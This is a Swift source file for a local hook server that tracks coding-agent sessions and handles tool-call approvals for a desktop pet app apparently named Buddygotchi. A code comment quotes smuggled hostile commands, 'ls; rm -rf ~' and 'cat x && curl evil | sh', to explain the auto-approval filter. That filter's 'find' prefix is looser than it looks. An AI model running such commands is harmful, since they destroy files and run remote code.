import Foundation
import Hummingbird
import HTTPTypes
import NIOCore
import CryptoKit

struct HookEventBody: Decodable, Sendable {
    var session_id: String?
    var conversation_id: String?
    var hook_event_name: String?
    var hookEventName: String?
    var cwd: String?
    var tool_name: String?
    var tool_input: ToolInput?
    var notification_type: String?
    var message: String?
    var command: String?
    var toolName: String?

    var tool: CursorTool?
    var input: ToolInput?

    struct CursorTool: Decodable, Sendable {
        var name: String?
    }

    struct ToolInput: Decodable, Sendable {
        var command: String?
        var file_path: String?
        var path: String?
        var url: String?
        var query: String?
        var description: String?
    }

    var effectiveEventName: String? {
        hook_event_name ?? hookEventName
    }

    var effectiveToolName: String? {
        tool_name ?? tool?.name ?? toolName ?? (command != nil ? "Shell" : nil)
    }

    var effectiveToolInput: ToolInput? {
        tool_input ?? input
    }
}

private struct SignalRequestBody: Decodable, Sendable {
    var agent_id: String?
    var session_id: String?
    var conversation_id: String?
    var signal: String?
    var cwd: String?
    var pid: Int32?
}

func buildHookServer(
    engine: BuddyEngine,
    config: BuddyConfig,
    isApprovalModeEnabled: @escaping @Sendable () -> Bool
) -> Application<RouterResponder<BasicRequestContext>> {
    let router = Router()
    let diagLog = engine.diagnosticLog

    router.get("/healthz") { _, _ -> Response in
        let state = await engine.state
        return jsonResponse([
            "ok": true,
            "stateVersion": state.version,
            "desktop": state.desktop.status.rawValue,
        ] as [String: Any])
    }

    router.post("/hook/event") { request, _ -> Response in
        guard isAuthorized(request, token: config.token) else { return unauthorized() }
        let source = request.uri.queryParameters["source"].map(String.init) ?? "claude-code"
        let rawBuffer = try await request.body.collect(upTo: 1_048_576)
        let rawJSON = String(buffer: rawBuffer)
        let body = try sharedDecoder.decode(HookEventBody.self, from: rawBuffer)
        let hookPid: Int32? = (body.effectiveEventName == "SessionStart")
            ? request.uri.queryParameters["pid"].flatMap({ Int32(String($0)) })
            : nil
        await diagLog.log(category: "hook", source: source, event: body.effectiveEventName ?? "unknown", detail: "\(body.effectiveToolName ?? "") \(extractHint(from: body))".trimmingCharacters(in: .whitespaces), rawPayload: rawJSON)
        await handleAgentEvent(
            body: body,
            source: source,
            hookPid: hookPid,
            isApprovalModeEnabled: isApprovalModeEnabled,
            engine: engine
        )
        return emptyOK()
    }

    router.post("/hook/signal") { request, _ -> Response in
        guard isAuthorized(request, token: config.token) else { return unauthorized() }
        let rawBuffer = try await request.body.collect(upTo: 1_048_576)
        let rawJSON = String(buffer: rawBuffer)
        let body = try sharedDecoder.decode(SignalRequestBody.self, from: rawBuffer)
        let source = body.agent_id ?? "claude-code"
        let sessionId = body.session_id ?? body.conversation_id ?? "\(source)_default"
        await diagLog.log(category: "signal", source: source, event: body.signal ?? "unknown", detail: "session=\(sessionId)", rawPayload: rawJSON)
        // A session-end signal deregisters the session outright — agents (e.g. Cursor)
        // route lifecycle close events here, and there is no process watcher to reap them.
        if body.signal == "session_end" {
            await engine.sessionEnded(sessionId: sessionId)
            return emptyOK()
        }
        // Cursor's helper spawn chain hasn't been verified for the parent-walk; Cursor cleanup uses explicit `session_end` + stale reap.
        await engine.sessionStarted(sessionId: sessionId, source: source, cwd: body.cwd, hookPid: nil)
        // Cursor's `stop` is a "task complete" event, equivalent to Claude Code's
        // Stop and Codex's Stop — route it to celebrate so the review surface fires.
        // The vestigial SignalCLI map says "stop_working" but we override server-side
        // so existing installations get the fix without reinstalling hooks.
        let effectiveSignal: String? = {
            if source == "cursor", body.signal == "stop_working" { return "celebrate" }
            return body.signal
        }()
        if let signalStr = effectiveSignal, let signal = ActivitySignalKind(rawValue: signalStr) {
            await engine.activitySignal(sessionId: sessionId, source: source, signal: signal)
        }
        return emptyOK()
    }

    router.post("/hook/approve") { request, _ -> Response in
        guard isAuthorized(request, token: config.token) else { return unauthorized() }
        let source = request.uri.queryParameters["source"].map(String.init) ?? "claude-code"
        let rawBuffer = try await request.body.collect(upTo: 1_048_576)
        let rawJSON = String(buffer: rawBuffer)
        let body = try sharedDecoder.decode(HookEventBody.self, from: rawBuffer)
        let sessionId = deriveSessionId(from: body, source: source)
        let tool = body.effectiveToolName ?? "Unknown"
        let hint = extractHint(from: body)
        let sessionLabel = cwdLabel(body.cwd)
        let requestId = "\(sessionId)_\(shortUUID())"

        await diagLog.log(category: "approve", source: source, event: body.effectiveEventName ?? "approve", detail: "\(tool): \(hint)", rawPayload: rawJSON)

        await engine.sessionStarted(sessionId: sessionId, source: source, cwd: body.cwd)

        if let autoDecision = shouldAutoApprove(tool: tool, hint: hint, source: source) {
            await diagLog.log(category: "approve", source: source, event: "auto-\(autoDecision.rawValue)", detail: tool)
            await engine.activitySignal(sessionId: sessionId, source: source, signal: .keepWorking, tool: tool, hint: hint)
            return approvalResponse(decision: autoDecision, source: source)
        }

        let decision = await engine.submitApproval(
            sessionId: sessionId,
            requestId: requestId,
            tool: tool,
            hint: hint,
            sessionLabel: sessionLabel,
            source: source
        )

        return approvalResponse(decision: decision, source: source)
    }

    return Application(
        router: router,
        configuration: .init(address: .hostname("127.0.0.1", port: config.httpPort))
    )
}

// MARK: - Agent Event Handler

func handleAgentEvent(
    body: HookEventBody,
    source: String,
    hookPid: Int32?,
    isApprovalModeEnabled: @escaping @Sendable () -> Bool,
    engine: BuddyEngine
) async {
    let sessionId = deriveSessionId(from: body, source: source)
    let event = body.effectiveEventName ?? ""
    let sessionLabel = cwdLabel(body.cwd)

    if event != "SessionEnd" {
        await engine.sessionStarted(sessionId: sessionId, source: source, cwd: body.cwd, hookPid: hookPid)
    }

    switch event {
    case "SessionStart":
        break

    case "UserPromptSubmit":
        await engine.activitySignal(sessionId: sessionId, source: source, signal: .startWorking)

    case "Stop":
        await engine.activitySignal(sessionId: sessionId, source: source, signal: .celebrate)

    case "StopFailure":
        await engine.activitySignal(sessionId: sessionId, source: source, signal: .error)

    case "PostToolUse":
        await engine.clearRequest(sessionId: sessionId)
        await engine.activitySignal(sessionId: sessionId, source: source, signal: .keepWorking, tool: body.effectiveToolName, hint: extractHint(from: body))

    case "PreToolUse":
        // Codex fires PreToolUse before running a tool. Keep the pet busy while the
        // tool runs (Codex has no separate "still working" signal between turns).
        await engine.activitySignal(sessionId: sessionId, source: source, signal: .keepWorking, tool: body.effectiveToolName, hint: extractHint(from: body))

    case "SessionEnd":
        await engine.sessionEnded(sessionId: sessionId)

    case "PermissionRequest":
        let tool = body.effectiveToolName ?? "Permission"
        let hint = extractHint(from: body)
        let requestId = "\(sessionId)_\(shortUUID())"
        await engine.submitRequest(sessionId: sessionId, requestId: requestId, tool: tool, hint: hint, sessionLabel: sessionLabel)

    case "Notification":
        switch body.notification_type {
        case "permission_prompt":
            // Skip when approval mode is on — the hook script routes these to /hook/approve instead.
            if isApprovalModeEnabled() { break }
            let requestId = "\(sessionId)_\(shortUUID())"
            await engine.submitRequest(sessionId: sessionId, requestId: requestId, tool: body.notification_type ?? "Notification", hint: body.message ?? "", sessionLabel: sessionLabel)
        case "elicitation_dialog":
            let requestId = "\(sessionId)_\(shortUUID())"
            await engine.submitRequest(sessionId: sessionId, requestId: requestId, tool: body.notification_type ?? "Notification", hint: body.message ?? "", sessionLabel: sessionLabel)
        case "idle_prompt":
            await engine.activitySignal(sessionId: sessionId, source: source, signal: .stopWorking)
        default:
            break
        }

    case "Elicitation":
        let requestId = "\(sessionId)_\(shortUUID())"
        await engine.submitRequest(sessionId: sessionId, requestId: requestId, tool: "Elicitation", hint: body.message ?? "", sessionLabel: sessionLabel)

    case "ElicitationResult":
        await engine.clearRequest(sessionId: sessionId)
        await engine.activitySignal(sessionId: sessionId, source: source, signal: .startWorking)

    default:
        break
    }
}

// MARK: - Approval Helpers

func approvalResponse(decision: ApprovalDecision, source: String) -> Response {
    if decision == .passthrough {
        if source == "cursor" {
            return jsonResponse(["permission": "ask"])
        }
        return emptyOK()
    }

    let payload: [String: Any]
    if source == "cursor" {
        switch decision {
        case .allow:
            payload = ["permission": "allow"]
        case .deny:
            payload = ["permission": "deny", "user_message": "Denied by Buddygotchi", "agent_message": "Tool call denied by Buddygotchi approval mode."]
        case .passthrough:
            payload = ["permission": "ask"]
        }
    } else {
        var decisionDict: [String: Any] = ["behavior": decision.rawValue]
        if decision == .deny {
            decisionDict["message"] = "Denied by Buddygotchi"
        }
        payload = [
            "hookSpecificOutput": [
                "hookEventName": "PermissionRequest",
                "decision": decisionDict,
            ] as [String: Any],
        ]
    }
    guard let data = try? JSONSerialization.data(withJSONObject: payload) else {
        return Response(status: .internalServerError)
    }
    return Response(
        status: .ok,
        headers: [.contentType: "application/json"],
        body: .init(byteBuffer: ByteBuffer(data: data))
    )
}

private let cursorAutoApproveTools: Set<String> = ["Read", "Glob", "Grep", "LSP", "WebFetch"]

private let cursorSafeShellPatterns: [String] = [
    #"^(ls|cat|head|tail|wc|find|grep|rg|fd|which|echo|pwd|date|whoami|hostname|uname)\b"#,
    #"^git (status|log|diff|show|branch|remote|tag)\b"#,
]

// Shell control operators that let a "safe" command prefix smuggle a second,
// dangerous command (e.g. `ls; rm -rf ~`, `cat x && curl evil | sh`, `git log > f`).
// If any appear, the command is NOT eligible for auto-approval — it must be
// reviewed manually.
private let shellControlCharacters = CharacterSet(charactersIn: ";&|`$()<>\n\r")

func shouldAutoApprove(tool: String, hint: String, source: String) -> ApprovalDecision? {
    guard source == "cursor" else { return nil }
    if cursorAutoApproveTools.contains(tool) { return .allow }
    if hint.rangeOfCharacter(from: shellControlCharacters) != nil { return nil }
    for pattern in cursorSafeShellPatterns {
        if hint.range(of: pattern, options: .regularExpression) != nil {
            return .allow
        }
    }
    return nil
}

// MARK: - Helpers

private func extractHint(from body: HookEventBody) -> String {
    if let cmd = body.command, !cmd.isEmpty { return String(cmd.prefix(200)) }
    if let ti = body.effectiveToolInput {
        if let desc = ti.description, !desc.isEmpty { return String(desc.prefix(200)) }
        for v in [ti.command, ti.file_path, ti.path, ti.url, ti.query] {
            if let v, !v.isEmpty { return String(v.prefix(200)) }
        }
    }
    return body.message ?? ""
}

private func cwdLabel(_ cwd: String?) -> String? {
    guard let cwd, !cwd.isEmpty else { return nil }
    return (cwd as NSString).lastPathComponent
}

func stableHashCwd(_ cwd: String?) -> String {
    guard let cwd, !cwd.isEmpty else { return "unknown" }
    let digest = SHA256.hash(data: Data(cwd.utf8))
    return digest.prefix(4).map { String(format: "%02x", $0) }.joined()
}

private func deriveSessionId(from body: HookEventBody, source: String) -> String {
    body.session_id ?? body.conversation_id ?? "\(source)_\(stableHashCwd(body.cwd))"
}

private func shortUUID() -> String {
    String(UUID().uuidString.replacingOccurrences(of: "-", with: "").prefix(12))
}

private let sharedDecoder = JSONDecoder()

private func isAuthorized(_ request: Request, token: String) -> Bool {
    guard !token.isEmpty,
          let headerName = HTTPField.Name("X-Buddygotchi-Token"),
          let providedToken = request.headers[headerName] else { return false }
    return constantTimeEquals(providedToken, token)
}

private func constantTimeEquals(_ lhs: String, _ rhs: String) -> Bool {
    let lhsBytes = Array(lhs.utf8)
    let rhsBytes = Array(rhs.utf8)
    let count = max(lhsBytes.count, rhsBytes.count)
    var diff = lhsBytes.count ^ rhsBytes.count
    for index in 0..<count {
        let lhsByte = index < lhsBytes.count ? lhsBytes[index] : 0
        let rhsByte = index < rhsBytes.count ? rhsBytes[index] : 0
        diff |= Int(lhsByte ^ rhsByte)
    }
    return diff == 0
}

private func unauthorized() -> Response {
    Response(status: .unauthorized, headers: [.contentLength: "0"])
}

private func decodeBody<T: Decodable>(_ type: T.Type, from request: Request) async throws -> T {
    let buffer = try await request.body.collect(upTo: 1_048_576)
    return try sharedDecoder.decode(type, from: buffer)
}

private func emptyOK() -> Response {
    Response(status: .ok, headers: [.contentLength: "0"])
}

private func jsonResponse(_ dict: [String: Any]) -> Response {
    guard let data = try? JSONSerialization.data(withJSONObject: dict) else {
        return Response(status: .internalServerError)
    }
    return Response(
        status: .ok,
        headers: [.contentType: "application/json"],
        body: .init(byteBuffer: ByteBuffer(data: data))
    )
}
